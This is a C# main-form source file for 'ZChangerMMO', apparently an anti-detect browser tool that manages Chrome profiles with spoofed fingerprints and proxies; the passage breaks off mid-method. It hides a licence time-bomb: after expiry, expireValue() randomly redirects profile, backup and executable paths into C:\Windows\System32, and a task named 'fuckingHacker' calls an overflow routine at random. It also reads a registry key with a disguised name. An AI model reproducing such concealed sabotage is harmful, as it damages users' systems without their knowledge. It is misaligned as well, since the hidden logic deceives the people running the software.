using Clifton.Core.Pipes;
using CommandModel;
using DevExpress.XtraEditors;
using DevExpress.XtraGrid.Views.Grid;
using EnumsNET;
using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Deployment.Application;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Serialization;
using ZChangerMMO.BackupAndRestore;
using ZChangerMMO.BaseHost;
using ZChangerMMO.DataModels;
using ZChangerMMO.Events;
using ZChangerMMO.Model;
using ZChangerMMO.Views.Forms;
using Screen = CommandModel.Screen;

namespace ZChangerMMO
{
    internal enum MainFormState
    {
        PROFILE_SETTING,
        RESTORE_PROCESSING
    }

    internal enum ProfileGridViewMode
    {
        GRID,
        CARD
    }

    internal enum LogActionType
    {
        [Description("Backup profile")]
        BACKUP,
        [Description("Restore profile")]
        RESTORE
    }

    internal partial class frmMain : Form
    {
        GridView _gridView;
        public frmMain(ZLicense lic)
        {
            Program.SplashManager.SplashDialog.IncrementLoadStep(1);
            Program.SplashManager.SplashDialog.SetStepText("Initialize component");
            
            InitializeComponent();

            Program.SplashManager.SplashDialog.IncrementLoadStep(1);
            Program.SplashManager.SplashDialog.SetStepText("Start host");
            try
            {
                // register host with chrome
                Host = new ChromeServerHost();
                if (!Host.IsRegisteredWithChrome())
                {
                    Host.GenerateManifest(Description, AllowedOrigins);
                    Host.Register();
                }
                checkAll();
            }
            catch { }

            Program.SplashManager.SplashDialog.IncrementLoadStep(1);
            Program.SplashManager.SplashDialog.SetStepText("Loading settings");
            serverPipes = new Dictionary<long, ServerPipe>();
            browserProcessDic = new Dictionary<long, int>();
            anonymousProfileDic = new Dictionary<long, Profile>();
            dbContext = new SQLiteProfileDbContext();
            BrowserInstallPath = GetInstalledBrowserPath();

            ReloadProfileGrid(dbContext);

            Program.SplashManager.SplashDialog.IncrementLoadStep(1);
            Program.SplashManager.SplashDialog.SetStepText("Loading backups");
            ReloadBackupItemGrid();

            Program.SplashManager.SplashDialog.IncrementLoadStep(1);
            Program.SplashManager.SplashDialog.SetStepText("Loading logs");
            ReloadLogActionGrid();

            Text = $"{Application.ProductName} v{CurrentVersion} - {lic.Username} (License expires on {lic.ExpirationDate.ToString("dd-MMM-yyyy")})";
        }

        private void Main_Load(object sender, EventArgs e)
        {
            Program.SplashManager.SplashDialog.IncrementLoadStep(1);
            try
            {
                content1.comboBoxEditDeviceModel.SelectedIndex = 0;
                Host.UnRegister();
                Host.GenerateManifest(Description, AllowedOrigins);
                Host.Register();
            }
            catch { }
            
            Program.SplashManager.SplashDialog.SetStepText("Ready..");
            
            UpdateUIMode(MainFormState.PROFILE_SETTING);
            UpdateProfileGridMode(ProfileGridViewMode.GRID);
            ToolbarControl();

            Program.SplashManager.SplashDialog.IncrementLoadStep(1);
            // Select first row
            gridView1.SelectRow(0);
            UpdateActionGroupButton();
            DisplayConfig();
            ReloadBackupItemGrid();
            ReloadLogActionGrid();
                        
            Program.SplashManager.SplashDialog.HideExt();
        }

        string CurrentVersion
        {
            get
            {
                return ApplicationDeployment.IsNetworkDeployed
                       ? ApplicationDeployment.CurrentDeployment.CurrentVersion.ToString()
                       : Assembly.GetExecutingAssembly().GetName().Version.ToString();
            }
        }

        void ToolbarControl()
        {
            object row;
            var enabled = false;
            _gridView = profileGridControl.FocusedView as GridView;

            try
            {
                row = _gridView.GetRow(_gridView.FocusedRowHandle);
                enabled = !(row is null);
            }
            catch { }

            _gridView.OptionsView.ShowGroupPanel = false;

            bbtnDeleteProfile.Enabled = enabled;
            bbtnEditProfile.Enabled = enabled;
            barButtonProxy.Enabled = enabled;
            rpgBrowserAction.Enabled = enabled;
            rpgManaProfile.Enabled = enabled;
            xscChanger.Enabled = enabled;
            xscBackupRestore.Enabled = enabled;
            rpgNativeHost.Enabled = enabled;
            rbgView.Enabled = enabled;
        }

        /// <summary>
        /// This C# code reads a key from the windows registry.
        /// </summary>
        /// <param name="keyName">
        /// <returns></returns>
        static string ReadRG(string keyName)
        {
            string subKey = "SOFTWARE\\WindowsAppServiceB2B";
            try
            {
                RegistryKey sk = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(subKey);
                if (sk == null)
                    return string.Empty;
                else
                    return sk.GetValue(keyName.ToUpper()).ToString();
            }
            catch (Exception ex)
            {
                return string.Empty;
            }
        }

        static string expireValue(string requestValue, string expiredValue)
        {
            if (TimeLock.IsExpired())
            {
                var generator = new RandomGenerator();

                if (generator.RandomNumber(1, 6) == 3)
                {
                    return expiredValue;
                }
            }

            return requestValue;
        }

        #region system actions
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("User32.dll", SetLastError = true)]
        static extern void SwitchToThisWindow(IntPtr hWnd, bool fAltTab);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        private struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public System.Drawing.Point ptMinPosition;
            public System.Drawing.Point ptMaxPosition;
            public System.Drawing.Rectangle rcNormalPosition;
        }

        #endregion

        #region Common properties

        private MainFormState State;
        private ProfileGridViewMode ProfileGridMode;
        Random _rnd = new Random(DateTime.Now.Second);

        #endregion

        #region Data access layer properties

        SQLiteProfileDbContext dbContext;

        #endregion

        #region Comunicate web browser properties

        static ChromeServerHost Host;
        static string[] AllowedOrigins = new string[] { "chrome-extension://khjlaccalgjpbimfpoifhncdempmnddn/" };
        static string Description = "Hosting for tranfer message between web browser and app";
        // contact with host
        Dictionary<long, ServerPipe> serverPipes;
        Dictionary<long, int> browserProcessDic;
        Dictionary<long, Profile> anonymousProfileDic;

        #endregion

        #region Location
        public string BrowserInstallPath { get; set; }

        public string BrowserProfilePathBase
        {
            get
            {
                return expireValue($"{BrowserInstallPath}\\BrowserData", "C:\\Windows\\System32\\");
            }
        }

        internal static string GetRandomString(int length, bool upper = false)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            if (upper)
            {
                return (new string(Enumerable.Repeat(chars, length)
                    .Select(s => s[_random.Next(s.Length)]).ToArray())).ToUpper();
            }
            else
            {
                return new string(Enumerable.Repeat(chars, length)
                  .Select(s => s[_random.Next(s.Length)]).ToArray());
            }
        }


        public string BrowserExecute
        {
            get
            {
                return expireValue(String.Format("{0}\\chrome.exe", GetInstalledBrowserPath()), "C:\\windows\\system32\\" + GetRandomString(8) + ".exe");
            }
        }

        private string GetProfileFolder(long id, string emailAddress)
        {
            emailAddress = emailAddress.Replace(" ", "_");
            if (!Directory.Exists(BrowserProfilePathBase))
            {
                Directory.CreateDirectory(BrowserProfilePathBase);
            }

            string profileFolder = $"{BrowserProfilePathBase}\\ZC_{id}_{emailAddress}";
            if (!Directory.Exists(profileFolder))
            {
                Directory.CreateDirectory(profileFolder);
            }

            return expireValue(profileFolder, "C:\\Windows\\System32\\chiwawa");
        }

        private string GetSavedBackUpPath(string email)
        {
            string path = $"{Application.StartupPath}\\BackupProfiles\\ZC_{email}";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }

            return expireValue(path, "C:\\Windows\\System32\\reminote");
        }

        private string GetInstalledBrowserPath()
        {
            RegistryKey regKey = Registry.LocalMachine.OpenSubKey(Constants.ZChangerLocationReg, true);
            return expireValue(regKey.GetValue("Browser").ToString(), "SOFTWARE\\sacramento");
        }
        #endregion

        #region Common actions
        private void UpdateUIMode(MainFormState mode)
        {
            State = mode;

            switch (mode)
            {
                case MainFormState.PROFILE_SETTING:
                    {
                        panelControl_Profile.Show();
                        panelControl_Loading.Hide();
                        break;
                    }
                case MainFormState.RESTORE_PROCESSING:
                    {
                        panelControl_Profile.Hide();
                        panelControl_Loading.Show();
                        break;
                    }
            }
        }

        private void UpdateProfileGridMode(ProfileGridViewMode mode)
        {
            ProfileGridMode = mode;
            switch (mode)
            {
                case ProfileGridViewMode.GRID:
                    {
                        profileGridControl.MainView = gridView1;
                        break;
                    }
                case ProfileGridViewMode.CARD:
                    {
                        profileGridControl.MainView = layoutView1;
                        break;
                    }
            }
        }

        private void ReloadProfileGrid(SQLiteProfileDbContext dbContext)
        {
            profileGridControl.DataSource = dbContext.Profiles.ToList();
        }

        private void SetSelectedProfile(long profileId)
        {
            switch (ProfileGridMode)
            {
                case ProfileGridViewMode.GRID:
                    {
                        int rowHandle = gridView1.LocateByValue("Id", profileId);
                        if (rowHandle != DevExpress.XtraGrid.GridControl.InvalidRowHandle)
                            gridView1.FocusedRowHandle = rowHandle;
                        break;
                    }
                case ProfileGridViewMode.CARD:
                    {
                        int rowHandle = layoutView1.LocateByValue("Id", profileId);
                        if (rowHandle != DevExpress.XtraGrid.GridControl.InvalidRowHandle)
                            layoutView1.FocusedRowHandle = rowHandle;
                        break;
                    }
            }

            UpdateActionGroupButton();
            DisplayConfig();
            ReloadBackupItemGrid();
            ReloadLogActionGrid();
        }

        private void ReloadBackupItemGrid()
        {
            try
            {
                Profile selectedObject = GetSelectedProfile();
                gridview_BackupItemGrid.DataSource = dbContext.BackupItems.Where(b => b.profile.Id == selectedObject.Id).ToList();
            }
            catch (Exception ex)
            {
                //XtraMessageBox.Show(ex.Message, "Cannot reload backup items", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ReloadLogActionGrid()
        {
            try
            {
                Profile selectedObject = GetSelectedProfile();
                logGridControl.DataSource = dbContext.ActionLogs.Where(b => b.profile.Id == selectedObject.Id).ToList();
            }
            catch (Exception ex)
            {
                //XtraMessageBox.Show(ex.Message, "Cannot reload log action items", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void UpdateActionGroupButton()
        {
            try
            {
                Profile selectedObject = GetSelectedProfile();
                // Update Action group buttons
                if (selectedObject != null)
                {
                    bool isProfileInstanceRunning = browserProcessDic.ContainsKey(selectedObject.Id);
                    btn_Run.Enabled = !isProfileInstanceRunning;
                    btn_Stop.Enabled = isProfileInstanceRunning;
                    btn_FocusBrowser.Enabled = isProfileInstanceRunning;
                }
                else
                {
                    btn_Run.Enabled = false;
                    btn_Stop.Enabled = false;
                    btn_FocusBrowser.Enabled = false;
                }
            }
            catch { }
        }

        private Profile GetSelectedProfile()
        {
            Profile selectedProfile = null;
            switch (ProfileGridMode)
            {
                case ProfileGridViewMode.GRID:
                    {
                        selectedProfile = gridView1.GetFocusedRow() as Profile;
                        break;
                    }
                case ProfileGridViewMode.CARD:
                    {
                        selectedProfile = layoutView1.GetFocusedRow() as Profile;
                        break;
                    }
            }

            if (selectedProfile == null) return null;//throw new Exception("No profile item selected");

            return selectedProfile;
        }

        private BackupItem GetSelectedBackUpItem()
        {
            var item = gridView2.GetFocusedRow() as BackupItem;
            if (item == null) throw new Exception("No Backup item selected.");
            return item;
        }

        private ActionLog GetSelectedLogActionItem()
        {
            var item = logGridControl_GridView.GetFocusedRow() as ActionLog;
            if (item == null) throw new Exception("No Log Action item selected.");
            return item;
        }

        private bool IsBrowserRunning(long profileId)
        {
            return browserProcessDic.TryGetValue(profileId, out int processId);
        }

        private ServerPipe GetSelectedServerPipe()
        {
            var profile = GetSelectedProfile();
            if (profile == null) throw new Exception("There is no profile is selected.");
            ServerPipe serverPipe;
            if (serverPipes.TryGetValue(profile.Id, out serverPipe))
            {
                return serverPipe;
            }
            else
            {
                throw new Exception("Cannot get server pipe");
            }
        }

        private void SetFocusProfileBrowser()
        {
            try
            {
                Profile selectedProfile = GetSelectedProfile();
                browserProcessDic.TryGetValue(selectedProfile.Id, out int processId);
                var process = Process.GetProcessById(processId);

                SwitchToThisWindow(process.MainWindowHandle, true);
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Cannot set focus browser", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void LogAction(long profileId, LogActionType actionType, string description)
        {
            try
            {
                using (var context = new SQLiteProfileDbContext())
                {
                    var profile = context.Profiles.FirstOrDefault(p => p.Id == profileId);
                    if (profile == null) throw new Exception("Profile does not existed");
                    context.ActionLogs.Add(new ActionLog()
                    {
                        profile = profile,
                        ActionType = actionType.AsString(EnumFormat.Description),
                        Description = description,
                        Time = DateTime.Now
                    });

                    context.SaveChanges();

                    ReloadLogActionGrid();
                }
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Cannot log action", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion

        #region Comunicate web browser actions

        private void CreateThreadToHandlerPipeServer(bool isAnonymous)
        {
            Thread serverThread = new Thread(ServerThread);

            serverThread.Start(isAnonymous);
        }

        private void ServerThread(object data)
        {
            bool isAnonymous = (bool)data;
            ServerPipe serverPipe = new ServerPipe("Test", p => p.StartStringReaderAsync());
            serverPipe.DataReceived += (sndr, args) =>
            {
                DataRecievedHandler(serverPipe, args, isAnonymous);
            };
            serverPipe.Connected += (sndr, args) =>
            {
                Profile selectedObject = GetSelectedProfile();
                if (!serverPipes.ContainsKey(selectedObject.Id))
                {
                    serverPipe.Id = selectedObject.Id;
                    serverPipes.Add(selectedObject.Id, serverPipe);
                }
            };
            serverPipe.PipeClosed += (sndr, args) =>
            {
                DissposeHostConnection(serverPipe.Id);
            };
        }

        public void DataRecievedHandler(ServerPipe serverPipe, PipeEventArgs arguments, bool isAnonymous)
        {
            var commandJsonString = arguments.String;
            BaseCommand baseCommand = JsonConvert.DeserializeObject<BaseCommand>(commandJsonString);
            if (baseCommand == null) return;
            switch (baseCommand.Command)
            {
                case ZC_Command.CONFIRM_CONNECT_HOST:
                    {
                        ConfirmConnectedHost response = JsonConvert.DeserializeObject<ConfirmConnectedHost>(commandJsonString);
                        if (response != null && response.IsSuccess)
                        {
                            Profile selectedObject = GetSelectedProfile();
                            if (isAnonymous)
                            {
                                Profile anonymousProfile;
                                anonymousProfileDic.TryGetValue(selectedObject.Id, out anonymousProfile);
                                selectedObject = anonymousProfile;
                                //selectedObject.Fonts = Fonts.Windows10;
                            }

                            List<string> ByPassListPattern = selectedObject.ByPassProxySites.Select(p =>
                            {
                                return $"*{p}*";
                            }).ToList();


                            SetProfileRequest request = new SetProfileRequest()
                            {
                                Command = ZC_Command.SET_PROFILE_REQUEST,
                                Profile = new BrowserProfile()
                                {
                                    Id = selectedObject.Id,
                                    Email = selectedObject.Email,
                                    CPU = selectedObject.CPU,
                                    Battery = selectedObject.Battery,
                                    EnableAudioApi = selectedObject.EnableAudioApi,
                                    EnablePlugins = selectedObject.EnablePlugins,
                                    EnableMediaPlugins = selectedObject.EnableMediaPlugins,
                                    Fonts = getFontOSMapping(selectedObject.OperatingSystem),//selectedObject.Fonts,
                                    RandomTimersEnabled = selectedObject.RandomTimersEnabled,
                                    UserAgent = selectedObject.UserAgent,
                                    Screen = selectedObject.Screen,
                                    HistoryLength = selectedObject.HistoryLength,
                                    WebGL = selectedObject.WebGL,
                                    FakeClientRects = true,
                                    Canvas = selectedObject.Canvas,
                                    EnableNetwork = selectedObject.EnableNetwork,
                                    Language = selectedObject.Language,
                                    GeoIpEnabled = selectedObject.GeoIpEnabled,
                                    ProxyEnabled = selectedObject.ProxyEnabled,
                                    Proxies = selectedObject.Proxies.Where(p => p.Enabled).ToList(),
                                    ByPassProxySites = ByPassListPattern,
                                }
                            };

                            serverPipe.WriteString(JsonConvert.SerializeObject(request));
                        }
                        break;
                    }
                case ZC_Command.NOTIFICATION:
                    {
                        Notification response = JsonConvert.DeserializeObject<Notification>(commandJsonString);
                        if (response != null && response.IsSuccess)
                        {
                            Notification request = new Notification()
                            {
                                Type = NotificationType.INFOR,
                                IsSuccess = true,
                                Message = "Hello from zchanger application"
                            };

                            serverPipe.WriteString(JsonConvert.SerializeObject(request));
                        }
                        break;
                    }
                case ZC_Command.DISCONNECT:
                    {
                        DissposeHostConnection(serverPipe.Id);
                        break;
                    }
            }
        }
        Fonts getFontOSMapping(string OSName)
        {
            switch (OSName.ToLower())
            {
                case "windowspc":
                    return Fonts.Windows10;
                case "macintosh":
                    return Fonts.MacOS;
                case "iphone":
                    return Fonts.MacOS;
                case "ipad":
                    return Fonts.MacOS;
                default:
                    return Fonts.Linux;
            }
        }
        private void DissposeHostConnection(long profileId)
        {
            if (browserProcessDic.ContainsKey(profileId))
            {
                int browserProcessId;
                if (browserProcessDic.TryGetValue(profileId, out browserProcessId))
                {
                    browserProcessDic.Remove(profileId);

                    var process = Process.GetProcessById(browserProcessId);
                    if (process != null)
                    {
                        process.Kill();
                    }
                }
            }
            if (serverPipes.ContainsKey(profileId))
            {
                serverPipes.Remove(profileId);
            }

            UpdateActionGroupButton();
        }

        #endregion

        #region UI event handlers

        #region Profile button group

        private void barBtn_NewProfile_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            var fm = new frmNewProfile();
            fm.NewProfileAction += newProfileActionHandler;
            fm.ShowDialog();

            _gridView.Focus();
            _gridView.MoveLast();
        }

        private void Btn_DeleteProfile_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            if (XtraMessageBox.Show("Do you want to delete profile?", "Delete", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                Profile selectedObject = GetSelectedProfile();
                try
                {
                    Profile found = dbContext.Profiles.FirstOrDefault(p => p.Id == selectedObject.Id);
                    if (found != null)
                    {
                        dbContext.Profiles.Remove(found);
                        dbContext.SaveChanges();
                        ReloadProfileGrid(dbContext);
                    }
                }
                catch (Exception ex)
                {

                }
            }
        }

        #endregion

        #region Browser action button group

        private void Btn_RefreshGrid_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            ReloadProfileGrid(this.dbContext);
        }

        private void btn_Run_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            Profile selectedObject = GetSelectedProfile();
            try
            {
                string profileFolder = GetProfileFolder(selectedObject.Id, selectedObject.Name);
                profileFolder = expireValue(profileFolder, "C:\\Windows\\System32\\AppData");
                CreateThreadToHandlerPipeServer(false);
                Process process = new Process();
                process.StartInfo.FileName = BrowserExecute;
                process.StartInfo.Arguments = $"--user-data-dir=\"{profileFolder}\"";
                process.Start();
                selectedObject = GetSelectedProfile();
                browserProcessDic.Add(selectedObject.Id, process.Id);
                UpdateActionGroupButton();
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Run Browser", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            if (_rnd.Next(6) > 3)
            {
                var fuckingHacker = new Task(() =>
                {
                    TimeLock.PerformOverflowIfExpired(Text);
                });
                fuckingHacker.Start();
            }
        }

        private void btn_Stop_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            try
            {
                Profile selectedObject = GetSelectedProfile();
                DissposeHostConnection(selectedObject.Id);
                UpdateActionGroupButton();
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Stop Browser", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void barBtn_ChangeView_List_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            UpdateProfileGridMode(ProfileGridViewMode.GRID);
        }

        private void barBtn_ChangeView_Card_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            UpdateProfileGridMode(ProfileGridViewMode.CARD);
        }

        private void btn_FocusBrowser_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            SetFocusProfileBrowser();
            UpdateActionGroupButton();
        }

        #endregion

        #region Backup/Restore items group buttons

        private void btn_Detail_AddBackupItem_Click(object sender, EventArgs e)
        {
            Profile selectedObject = GetSelectedProfile();
            if (IsBrowserRunning(selectedObject.Id))
            {
                XtraMessageBoxArgs args = new XtraMessageBoxArgs();
                //args.AutoCloseOptions.Delay = 5000;
                args.Caption = "Browser instance is open";
                args.Text = "This task need to close browser first, Are you want to close browser or cancel backup task?";
                args.Buttons = new DialogResult[] { DialogResult.OK, DialogResult.Cancel };
                if (XtraMessageBox.Show(args) == DialogResult.OK)
                {
                    DissposeHostConnection(selectedObject.Id);
                    UpdateActionGroupButton();
                }
                else
                {
                    return;
                }
            }

            // do backup process
            string profilePath = GetProfileFolder(selectedObject.Id, selectedObject.Name);
            string destFolder = GetSavedBackUpPath(selectedObject.Name);
            Backup backUpForm = new Backup(profilePath, destFolder, selectedObject);
            backUpForm.BackUpFormAction += backUpFormActionHandler;
            backUpForm.ShowDialog();
        }

        private void btn_Detail_Restore_Click(object sender, EventArgs e)
        {
            Profile selectedObject = GetSelectedProfile();
            if (IsBrowserRunning(selectedObject.Id))
            {
                XtraMessageBoxArgs args = new XtraMessageBoxArgs();
                //args.AutoCloseOptions.Delay = 5000;
                args.Caption = "Browser is open";
                args.Text = "This task need to close browser first, Are you want to close browser or cancel restore task?";
                args.Buttons = new DialogResult[] { DialogResult.OK, DialogResult.Cancel };
                if (XtraMessageBox.Show(args) == DialogResult.OK)
                {
                    DissposeHostConnection(selectedObject.Id);
                    UpdateActionGroupButton();
                    Thread.Sleep(500);
                }
                else
                {
                    return;
                }
            }

            UpdateUIMode(MainFormState.RESTORE_PROCESSING);
            work_Restore.RunWorkerAsync();
        }

        private void btn_Detail_Delete_Click(object sender, EventArgs e)
        {
            try
            {
                BackupItem selectedItem = GetSelectedBackUpItem();
                dbContext.BackupItems.Remove(selectedItem);
                dbContext.SaveChanges();
                ReloadBackupItemGrid();
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Cannot Delete profile", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btn_DeleteLogAction_Click(object sender, EventArgs e)
        {
            try
            {
                var selectedItem = GetSelectedLogActionItem();
                dbContext.ActionLogs.Remove(selectedItem);
                dbContext.SaveChanges();
                ReloadLogActionGrid();
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Cannot Delete log item", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion

        private void gridView1_RowClick(object sender, DevExpress.XtraGrid.Views.Grid.RowClickEventArgs e)
        {
            UpdateActionGroupButton();
            DisplayConfig();
            ReloadBackupItemGrid();
            ReloadLogActionGrid();
        }

        private void gridView1_SelectionChanged(object sender, DevExpress.Data.SelectionChangedEventArgs e)
        {
            UpdateActionGroupButton();
            ReloadBackupItemGrid();
            ReloadLogActionGrid();
        }

        private void layoutView1_CardClick(object sender, DevExpress.XtraGrid.Views.Layout.Events.CardClickEventArgs e)
        {
            UpdateActionGroupButton();
            ReloadBackupItemGrid();
            ReloadLogActionGrid();
        }

        #endregion

        #region Native Host group button events handlers

        private void btn_Register_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            Host.GenerateManifest(Description, AllowedOrigins);
            Host.Register();

            XtraMessageBox.Show("Host registered!", "Register", MessageBoxButtons.OK);

        }

        private void btn_Unregister_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            Host.UnRegister();

            XtraMessageBox.Show("Host unregistered!", "Register", MessageBoxButtons.OK);
        }

        #endregion

        #region Backup browser profile process

        private void backUpFormActionHandler(object sender, EventArgs e)
        {
            BackUpFormEventArgs data = (BackUpFormEventArgs)e;

            switch (data.ActionType)
            {
                case BackUpFormActionType.FINISH_BACKUP:
                    {
                        Profile selectedObject = GetSelectedProfile();
                        var newBackupDataItem = new BackupItem()
                        {
                            Name = data.BackupName,
                            BackupTime = data.BackupTime,
                            FilePath = data.FilePath
                        };

                        var selectedProfile = dbContext.Profiles.FirstOrDefault(p => p.Id == selectedObject.Id);
                        if (selectedProfile != null)
                        {
                            // add backup item
                            if (selectedProfile.BackupItems == null)
                            {
                                selectedProfile.BackupItems = new List<BackupItem>();
                            }
                            selectedProfile.BackupItems.Add(newBackupDataItem);
                            dbContext.SaveChanges();
                            LogAction(selectedObject.Id, LogActionType.BACKUP, $"Backup item {data.BackupName}");
                            ReloadBackupItemGrid();
                            ReloadLogActionGrid();
                        }

                        break;
                    }
                case BackUpFormActionType.CLOSE_DIALOG:
                    {
                        break;
                    }
            }
        }

        #endregion

        #region Restore browser profile data

        private void work_Restore_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                RestoreProcess restoreProcess = new RestoreProcess();
                BackupItem selectedBackupItem = gridView2.GetFocusedRow() as BackupItem;
                string destFolder = $"{GetProfileFolder(selectedBackupItem.profile.Id, selectedBackupItem.profile.Name)}";
                restoreProcess.ExtractFileToDirectory(selectedBackupItem.FilePath, destFolder);
                // get backup profile
                var profilePath = $"{destFolder}\\{Constants.ProfileBackUpFileName}";
                if (File.Exists(profilePath))
                {
                    var mySerializer = new XmlSerializer(typeof(ProfileXML));
                    // To read the file, create a FileStream.
                    var myFileStream = new FileStream(profilePath, FileMode.Open);
                    // Call the Deserialize method and cast to the object type.
                    var savedProfile = (ProfileXML)mySerializer.Deserialize(myFileStream);
                    myFileStream.Close();
                    UpdateSelectedProfile(savedProfile);
                    File.Delete(profilePath);
                }
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Error restore action", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void work_Restore_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            try
            {
                UpdateUIMode(MainFormState.PROFILE_SETTING);
                var profile = GetSelectedProfile();
                var backupItem = GetSelectedBackUpItem();
                LogAction(profile.Id, LogActionType.RESTORE, $"Restore item {backupItem.Name}");

                XtraMessageBox.Show("Profile has been restored!", "Restore profile", MessageBoxButtons.OK);
            }
            catch (Exception ex)
            {
                XtraMessageBox.Show(ex.Message, "Error log restore action", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void work_Restore_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {

        }

        private void UpdateSelectedProfile(ProfileXML savedProfile)
        {
            try
            {
                var selectedProfileItem = GetSelectedProfile();
                using (SQLiteProfileDbContext context = new SQLiteProfileDbContext())
                {
                    Profile selectedProfile = context.Profiles.FirstOrDefault(p => p.Id == selectedProfileItem.Id);
                    selectedProfile.Description = savedProfile.Description;
                    selectedProfile.Email = savedProfile.Email;
                    selectedProfile.Fonts = savedProfile.Fonts;
                    selectedProfile.Name = savedProfile.Name;
                    selectedProfile.OperatingSystem = savedProfile.OperatingSystem;
                    selectedProfile.CPU.DeviceMemory = savedProfile.CPU.DeviceMemory;
                    selectedProfile.CPU.HardwareConcurrency = savedProfile.CPU.HardwareConcurrency;
                    selectedProfile.Battery.Charging = savedProfile.Battery.Charging;
                    selectedProfile.Battery.ChargingTime = savedProfile.Battery.ChargingTime;
                    selectedProfile.Battery.DischargingTime = savedProfile.Battery.DischargingTime;
                    selectedProfile.Battery.Level = savedProfile.Battery.Level;
                    selectedProfile.EnableAudioApi = savedProfile.EnableAudioApi;
                    selectedProfile.EnablePlugins = savedProfile.EnablePlugins;
                    selectedProfile.EnableMediaPlugins = savedProfile.EnableMediaPlugins;
                    selectedProfile.RandomTimersEnabled = savedProfile.RandomTimersEnabled;
                    selectedProfile.UserAgent = savedProfile.UserAgent;
                    selectedProfile.Screen.Color = savedProfile.Screen.Color;
                    selectedProfile.Screen.Height = savedProfile.Screen.Height;
                    selectedProfile.Screen.Width = savedProfile.Screen.Width;
                    selectedProfile.HistoryLength = savedProfile.HistoryLength;
                    selectedProfile.WebGL.BrowserplugsR = savedProfile.WebGL.BrowserplugsR;
                    selectedProfile.WebGL.Plus1 = savedProfile.WebGL.Plus1;
                    selectedProfile.WebGL.Plus2 = savedProfile.WebGL.Plus2;
                    selectedProfile.WebGL.Plus3 = savedProfile.WebGL.Plus3;
                    selectedProfile.WebGL.Plus4 = savedProfile.WebGL.Plus4;
                    selectedProfile.WebGL.Plus5 = savedProfile.WebGL.Plus5;
                    selectedProfile.FakeClientRects = savedProfile.FakeClientRects;
                    selectedProfile.Canvas.B = savedProfile.Canvas.B;
                    selectedProfile.Canvas.G = savedProfile.Canvas.G;
                    selectedProfile.Canvas.R = savedProfile.Canvas.R;
                    selectedProfile.EnableNetwork = savedProfile.EnableNetwork;
                    selectedProfile.Language = savedProfile.Language;
                    selectedProfile.GeoIpEnabled = savedProfile.GeoIpEnabled;
                    selectedProfile.ByPassProxySites = savedProfile.ByPassProxySites;
                    selectedProfile.Proxies = savedProfile.Proxies;

                    context.SaveChanges();
                    ReloadProfileGrid(context);
                    SetSelectedProfile(selectedProfile.Id);
                }
            }
            catch (Exception ex)
            {
                throw new Exception("Update backup profile error");
            }
        }
        #endregion

        #region New profile process

        private void newProfileActionHandler(object sender, EventArgs e)
        {
            AddNewProfileActionType actionType = ((AddNewProfileEventArgs)e).ActionType;
            string message = ((AddNewProfileEventArgs)e).Message;

            switch (actionType)
            {
                case AddNewProfileActionType.ADD_SUCCESS:
                    {
                        profileGridControl.DataSource = dbContext.Profiles.ToList();
                        break;
                    }
                case AddNewProfileActionType.CLOSE_DIALOG:
                    {
                        break;
                    }
            }
        }


        #endregion

        private void DisplayConfig()
        {
            var rowSelected = GetSelectedProfile();
            if (rowSelected != null)
            {
                #region Device
                Device1.comboBoxEditDeviceMemory.Text = rowSelected.CPU.DeviceMemory.ToString();
                Device1.comboBoxEditHardwareConcurrency.Text = rowSelected.CPU.HardwareConcurrency.ToString();

                Device1.checkBoxCharging.Checked = rowSelected.Battery.Charging;
                Device1.comboBoxEditChargingTime.Text = rowSelected.Battery.ChargingTime.ToString();
                Device1.comboBoxEditDischargingTime.Text = rowSelected.Battery.DischargingTime.ToString();
                Device1.comboBoxEditLevel.Text = rowSelected.Battery.Level.ToString();

